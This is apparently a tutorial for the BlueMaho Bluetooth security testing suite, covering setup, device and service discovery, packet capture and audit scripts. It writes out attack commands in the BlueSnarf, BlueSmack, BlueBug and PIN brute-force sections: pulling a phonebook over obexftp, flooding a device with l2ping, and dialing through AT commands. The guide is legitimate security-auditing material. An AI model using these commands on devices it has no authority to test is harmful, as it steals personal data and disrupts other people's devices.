# BlueMaho

## Introduction

## What is BlueMaho?

BlueMaho is a GUI-based Bluetooth security testing suite built on top of command-line Bluetooth tools. It provides a user-friendly interface for performing various Bluetooth security assessments, including device discovery, service enumeration, vulnerability scanning, and attack simulations on Bluetooth-enabled devices.

## Why BlueMaho?

- User-friendly GUI for Bluetooth testing
- Comprehensive Bluetooth security features
- Device discovery and enumeration
- Service and vulnerability scanning
- BlueSnarf, BlueBug, and other attacks
- Built on proven command-line tools
- Useful for Bluetooth security auditing

## Learning Path

1. Understand Bluetooth protocol basics
2. Learn about Bluetooth security vulnerabilities
3. Set up Bluetooth adapter
4. Practice device discovery
5. Master security assessment techniques

## User Guide

## Prerequisites

- Linux system (tested on Debian/Ubuntu-based distributions)
- Bluetooth adapter (USB or built-in)
- Root/sudo privileges
- Python and required dependencies
- **Authorization**: Only test devices you own or have permission to test

Check Bluetooth adapter:

```bash
hciconfig -a
```

## Installation

### Ubuntu/Debian

```bash
# Install dependencies
sudo apt update
sudo apt install python-wxgtk2.8 python-wxtools bluetooth bluez-utils bluez-compat

# Install additional Bluetooth tools
sudo apt install bluez bluez-tools libbluetooth-dev

# Download BlueMaho
git clone https://github.com/balle/bluemaho.git
cd bluemaho

# Make executable
chmod +x bluemaho.py
```

### Dependencies

```bash
# Core dependencies
sudo apt install python python-gtk2 python-glade2

# Bluetooth stack
sudo apt install bluez bluez-utils bluez-compat bluez-hcidump

# Additional tools
sudo apt install obexftp ussp-push
```

### Alternative installation (from source)

```bash
# Clone repository
git clone https://github.com/balle/bluemaho.git
cd bluemaho

# Install Python dependencies
pip install wxPython
pip install pybluez

# Run
sudo python bluemaho.py
```

## Basic Setup

### Configure Bluetooth adapter

```bash
# Check Bluetooth service
sudo systemctl status bluetooth

# Start Bluetooth service
sudo systemctl start bluetooth

# Enable on boot
sudo systemctl enable bluetooth

# List Bluetooth adapters
hciconfig

# Bring up adapter
sudo hciconfig hci0 up

# Check adapter info
hciconfig hci0 -a
```

### Bluetooth adapter modes

```bash
# Set discoverable
sudo hciconfig hci0 piscan

# Set non-discoverable
sudo hciconfig hci0 noscan

# Reset adapter
sudo hciconfig hci0 reset
```

## Launching BlueMaho

### Start the application

```bash
# From bluemaho directory
sudo python bluemaho.py

# Or if made executable
sudo ./bluemaho.py
```

### GUI Overview

```
Main window contains:
- Device Discovery tab
- Service Discovery tab
- Security Scanning tab
- Attack modules
- Configuration options
```

## Device Discovery

### Scan for devices

```bash
# In BlueMaho GUI:
# 1. Select "Discovery" tab
# 2. Click "Scan for devices"
# 3. Wait for nearby Bluetooth devices to appear

# Command-line equivalent:
hcitool scan

# More detailed scan
sudo hcitool inq
```

### Get device information

```bash
# After discovery, select device
# Click "Get Info" to retrieve:
# - Device name
# - Device class
# - Manufacturer
# - Supported features

# Command-line:
hcitool info <BD_ADDR>
```

## Service Discovery

### Enumerate services (SDP)

```bash
# In BlueMaho:
# 1. Select discovered device
# 2. Go to "Services" tab
# 3. Click "Enumerate Services"

# Command-line:
sdptool browse <BD_ADDR>

# Search for specific service
sdptool search OPUSH <BD_ADDR>
```

### Common Bluetooth services

```
- OBEX Object Push (file transfer)
- OBEX File Transfer (FTP)
- Dial-Up Networking (DUN)
- Serial Port Profile (SPP)
- Human Interface Device (HID)
- Advanced Audio Distribution (A2DP)
- Headset Profile (HSP)
- Hands-Free Profile (HFP)
```

## Security Scanning

### Vulnerability assessment

```bash
# BlueMaho includes scanners for:
# - BlueSnarf vulnerability
# - BlueBug vulnerability
# - HeloMoto vulnerability
# - BlueSmack (DoS)

# Run scan from GUI:
# 1. Select target device
# 2. Choose vulnerability test
# 3. Click "Test"
```

### PIN/Pairing tests

```bash
# Test pairing security
# 1. Attempt pairing with device
# 2. Test PIN strength
# 3. Check for default PINs

# Common default PINs:
# 0000, 1234, 1111, 9999
```

## Attack Modules

### BlueSnarf attack

```bash
# BlueSnarf: Access phonebook and files
# In BlueMaho:
# 1. Select target device
# 2. Choose "BlueSnarf" attack
# 3. Specify file to retrieve (e.g., telecom/pb.vcf)

# Manual command:
obexftp -b <BD_ADDR> -c telecom -g pb.vcf
```

### BlueBug attack

```bash
# BlueBug: Execute AT commands on device
# In BlueMaho:
# 1. Select vulnerable device
# 2. Choose "BlueBug" attack
# 3. Send AT commands

# AT commands examples:
# ATD<number> - Dial number
# AT+CLIP=1 - Show incoming caller ID
```

### File transfer (OBEX Push)

```bash
# Send file to device
# In BlueMaho:
# 1. Select device with OBEX Push
# 2. Choose file to send
# 3. Click "Send"

# Command-line:
ussp-push <BD_ADDR>@<channel> file.jpg file.jpg
obexftp -b <BD_ADDR> -p file.txt
```

### L2CAP Ping (BlueSmack)

```bash
# DoS attack using oversized L2CAP packets
# In BlueMaho:
# 1. Select target
# 2. Choose "BlueSmack"
# 3. Execute

# Command-line:
l2ping -s 600 -f <BD_ADDR>
```

## Information Gathering

### Device fingerprinting

```bash
# Gather device information:
# - Manufacturer
# - Device type
# - Supported services
# - Clock offset
# - Class of device

# Command-line tools:
hcitool info <BD_ADDR>
sdptool browse <BD_ADDR>
```

### Monitor Bluetooth traffic

```bash
# Capture Bluetooth packets
sudo hcidump -X -V

# Save to file
sudo hcidump -w capture.dump

# Filter by device
sudo hcidump -i hci0 -w capture.dump
```

## Advanced Features

### Brute force pairing

```bash
# Attempt pairing with common PINs
# Create PIN list:
cat > pins.txt << EOF
0000
1234
1111
9999
0001
1010
EOF

# Test PINs (manual or scripted)
# BlueMaho may include automated PIN testing
```

### Custom service queries

```bash
# Query specific service UUIDs
sdptool search --bdaddr=<BD_ADDR> <UUID>

# Common UUIDs:
# 0x1105 - OBEX Object Push
# 0x1106 - OBEX File Transfer
# 0x110A - Audio Source
# 0x1112 - Headset Audio Gateway
```

## Command-Line Bluetooth Tools

### hcitool (device control)

```bash
# Scan for devices
hcitool scan

# Inquiry scan (more detailed)
sudo hcitool inq

# Get device info
hcitool info <BD_ADDR>

# Get name
hcitool name <BD_ADDR>

# Test connection
sudo hcitool cc <BD_ADDR>
sudo hcitool con
```

### sdptool (service discovery)

```bash
# Browse all services
sdptool browse <BD_ADDR>

# Search for service
sdptool search OPUSH <BD_ADDR>
sdptool search FTP <BD_ADDR>

# Get local services
sdptool browse local
```

### l2ping (connectivity test)

```bash
# Ping Bluetooth device
l2ping <BD_ADDR>

# Flood ping (BlueSmack DoS)
sudo l2ping -f -s 600 <BD_ADDR>

# Set packet count
l2ping -c 10 <BD_ADDR>
```

### rfcomm (serial connection)

```bash
# Bind RFCOMM device
sudo rfcomm bind 0 <BD_ADDR> <channel>

# Release binding
sudo rfcomm release 0

# Show bindings
rfcomm show
```

### hcidump (packet capture)

```bash
# Capture all Bluetooth traffic
sudo hcidump -X -V

# Save to file
sudo hcidump -w bluetooth.dump

# Read from file
hcidump -r bluetooth.dump
```

## Scripting and Automation

### Automated device scan

```bash
#!/bin/bash
# Scan for Bluetooth devices and log

LOGFILE="bluetooth_devices_$(date +%Y%m%d_%H%M%S).log"

echo "Scanning for Bluetooth devices..." | tee $LOGFILE
echo "=================================" | tee -a $LOGFILE

hcitool scan | while read line; do
    if [[ $line =~ ([0-9A-F:]{17}) ]]; then
        bdaddr="${BASH_REMATCH[1]}"
        echo "Found: $line" | tee -a $LOGFILE
        echo "  Name: $(hcitool name $bdaddr)" | tee -a $LOGFILE
        echo "  Services:" | tee -a $LOGFILE
        sdptool browse $bdaddr 2>/dev/null | grep "Service Name" | tee -a $LOGFILE
        echo "---" | tee -a $LOGFILE
    fi
done

echo "Scan complete. Results in $LOGFILE"
```

### Service enumeration script

```bash
#!/bin/bash
# Enumerate services on Bluetooth device

BDADDR=$1

if [ -z "$BDADDR" ]; then
    echo "Usage: $0 <BD_ADDR>"
    exit 1
fi

echo "Enumerating services on $BDADDR"
echo "==============================="

# Get device name
echo "Device name: $(hcitool name $BDADDR)"

# Browse services
echo -e "\nAvailable services:"
sdptool browse $BDADDR | grep -E "Service Name|Channel"

# Test specific services
echo -e "\nTesting OBEX Object Push:"
sdptool search OPUSH $BDADDR

echo -e "\nTesting File Transfer:"
sdptool search FTP $BDADDR
```

### Security assessment script

```bash
#!/bin/bash
# Basic Bluetooth security assessment

TARGET=$1

echo "Bluetooth Security Assessment"
echo "Target: $TARGET"
echo "=============================="

# Device info
echo -e "\n[*] Device Information:"
hcitool info $TARGET

# Name
echo -e "\n[*] Device Name:"
hcitool name $TARGET

# Services
echo -e "\n[*] Available Services:"
sdptool browse $TARGET 2>/dev/null | grep "Service Name"

# Connectivity test
echo -e "\n[*] Connectivity Test:"
l2ping -c 5 $TARGET

# Test for BlueSnarf
echo -e "\n[*] Testing for BlueSnarf vulnerability:"
obexftp -b $TARGET -c telecom -g pb.vcf 2>&1 | grep -q "Success" && echo "VULNERABLE" || echo "Not vulnerable"

echo -e "\nAssessment complete"
```

## Common Use Cases

### Security audit of Bluetooth devices

```bash
# 1. Discover devices
sudo python bluemaho.py
# Click "Scan for devices"

# 2. Enumerate services
# Select device, enumerate services

# 3. Test vulnerabilities
# Run BlueSnarf, BlueBug tests

# 4. Document findings
```

### Test Bluetooth headset security

```bash
# Scan for headset
hcitool scan

# Get info
hcitool info <BD_ADDR>

# Enumerate audio services
sdptool search AUDIO <BD_ADDR>

# Test pairing
# Attempt pairing with common PINs
```

### Identify rogue Bluetooth devices

```bash
# Continuous monitoring
while true; do
    hcitool scan > /tmp/bt_scan.txt
    # Compare with known devices
    diff /tmp/bt_scan.txt known_devices.txt
    sleep 300  # Scan every 5 minutes
done
```

## Troubleshooting

### Bluetooth adapter not detected

```bash
# Check if Bluetooth service is running
sudo systemctl status bluetooth

# Start service
sudo systemctl start bluetooth

# Check for hardware
lsusb | grep -i bluetooth
hciconfig -a

# Reset adapter
sudo hciconfig hci0 down
sudo hciconfig hci0 up
```

### Cannot discover devices

```bash
# Ensure adapter is up and scanning
sudo hciconfig hci0 up
sudo hciconfig hci0 piscan

# Increase scan time
hcitool scan --length=30

# Check for interference
# Move away from WiFi devices
```

### Permission errors

```bash
# Run with sudo
sudo python bluemaho.py

# Or add user to bluetooth group
sudo usermod -a -G bluetooth $USER
# Logout and login again
```

### BlueMaho GUI not starting

```bash
# Check Python dependencies
python -c "import wx"
python -c "import bluetooth"

# Install missing dependencies
sudo apt install python-wxgtk2.8 python-bluez

# Check for errors
sudo python bluemaho.py --verbose
```

## Security and Legal Considerations

### ⚠️ Legal Warning

- **Only test Bluetooth devices you own or have explicit permission to test**
- Unauthorized access to Bluetooth devices is **illegal**
- Violating privacy and computer fraud laws can result in criminal prosecution
- Always obtain written authorization for security testing

### Ethical usage

```bash
# Legitimate uses:
# - Testing your own devices
# - Authorized security assessments
# - Research in controlled lab environment
# - Security awareness training

# Best practices:
# - Document all testing authorization
# - Define scope and boundaries
# - Avoid disrupting device operation
# - Use responsible disclosure for vulnerabilities
# - Follow local regulations and laws
```

## Quick Reference

### Common commands

```bash
# Start BlueMaho
sudo python bluemaho.py

# Scan for devices (CLI)
hcitool scan

# Get device info
hcitool info <BD_ADDR>

# Browse services
sdptool browse <BD_ADDR>

# Ping device
l2ping <BD_ADDR>

# Capture traffic
sudo hcidump -X -V
```

### Bluetooth address format

```
BD_ADDR format: XX:XX:XX:XX:XX:XX
Example: 00:11:22:33:44:55
```

## Alternatives and Related Tools

### Other Bluetooth security tools

```bash
# Btscanner - GUI scanner
sudo apt install btscanner
btscanner

# Bluelog - Bluetooth site survey
sudo apt install bluelog
bluelog -i hci0

# Redfang - Find hidden Bluetooth devices
git clone https://github.com/tenable/redfang.git

# Bluesnarfer - BlueSnarf tool
sudo apt install bluesnarfer
bluesnarfer -b <BD_ADDR>

# Carwhisperer - Car kit attack
# (specialized tool)
```

## Real-World Examples

### Assess corporate Bluetooth policy

```bash
# With authorization
# 1. Survey building for Bluetooth devices
sudo bluelog -i hci0 -o corporate_survey.log

# 2. Identify unauthorized devices
# Compare with approved device list

# 3. Test device security
sudo python bluemaho.py
# Test each device for vulnerabilities

# 4. Report findings
```

### Test IoT device security

```bash
# Scan for IoT device
hcitool scan

# Enumerate services
sdptool browse <BD_ADDR>

# Test for:
# - Weak pairing
# - Default PINs
# - Service vulnerabilities
# - Information disclosure
```

### Demonstrate Bluetooth risks

```bash
# In controlled environment
# Show how easily Bluetooth devices can be:
# - Discovered
# - Services enumerated
# - Files accessed (if vulnerable)

# Use for security awareness training
```

## Resources

- [BlueMaho GitHub](https://github.com/balle/bluemaho)
- [Bluetooth Core Specification](https://www.bluetooth.com/specifications/specs/)
- [BlueZ - Linux Bluetooth Stack](http://www.bluez.org/)
- [OWASP IoT Security](https://owasp.org/www-project-internet-of-things/)

## Next Steps

- Learn about Bluetooth Low Energy (BLE)
- Study Bluetooth security vulnerabilities (CVEs)
- Explore BLE scanning tools (gatttool, bleah)
- Practice in isolated lab environment
- Learn about Bluetooth protocol stack
- Study wireless security fundamentals
- Obtain security certifications (CEH, OSWP)
